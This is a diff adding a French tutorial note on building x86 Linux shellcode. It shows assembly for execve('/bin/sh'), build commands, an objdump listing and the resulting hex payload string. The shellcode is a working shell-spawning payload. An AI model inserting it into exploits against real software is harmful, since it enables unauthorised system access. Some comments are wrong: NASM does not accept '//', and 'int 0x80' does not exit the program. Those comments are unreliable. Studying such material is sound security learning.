@@ -1,0 +1,45 @@
+Alors tout d'abord le shellcode il faut créer un programme assembleur
+qui va lancer un execve("/bin/sh", NULL, NULL):
+
+global _start
+section .text
+_start:
+	xor ebx, ebx		//	xor mise à 0 des registres principaux
+	xor edx, edx		//	ebx, edx, ecx
+	xor ecx, ecx		//	ebx et edx vont être les arguments 3 et 2 de la fonction execve
+	push ecx			//	ecx va etre push et derrière on va mettre /bin/sh à l'envers
+	push 0x68732f6e		//	= 'hs/n'
+	push 0x69622f2f		//	= 'ib//'
+	mov ebx, esp		//	Stack dans ebx
+	xor eax, eax		//	Mise à 0 du dernier registre
+	mov al, 0xb			//	Call système 11 (0xb) qui correspond à execve
+	and esp, 0xfffffff0	//	Alignement mémoire sinon segfault
+	int 0x80			//	On quitte le programme proprement
+
+Compilation:
+	nasm -f elf32 shellcode.s
+	ld -m elf_i386 -o ./shellcode shellcode.o
+
+On transforme maintenant ce programme en shellcode:
+	objdump -d shellcode
+
+08048060 <_start>:
+8048060:	31 db                	xor    %ebx,%ebx
+8048062:	31 d2                	xor    %edx,%edx
+8048064:	31 c9                	xor    %ecx,%ecx
+8048066:	51                   	push   %ecx
+8048067:	68 6e 2f 73 68       	push   $0x68732f6e
+804806c:	68 2f 2f 62 69       	push   $0x69622f2f
+8048071:	89 e3                	mov    %esp,%ebx
+8048073:	31 c0                	xor    %eax,%eax
+8048075:	b0 0b                	mov    $0xb,%al
+8048077:	83 e4 f0             	and    $0xfffffff0,%esp
+804807a:	cd 80                	int    $0x80
+
+Sur la ligne centrale se trouvent l'équivalent en hexa des actions effectuées.
+Pour le convertir en shellcode, nous allons prendre chaque nombre hexa et y ajouter \x
+devant.
+Shellcode = "\x31\xdb\x31\xd2\x31\xc9\x51\x68"
+			"\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+			"\x69\x89\xe3\x31\xc0\xb0\x0b\x83"
+			"\xe4\xf0\xcd\x80"
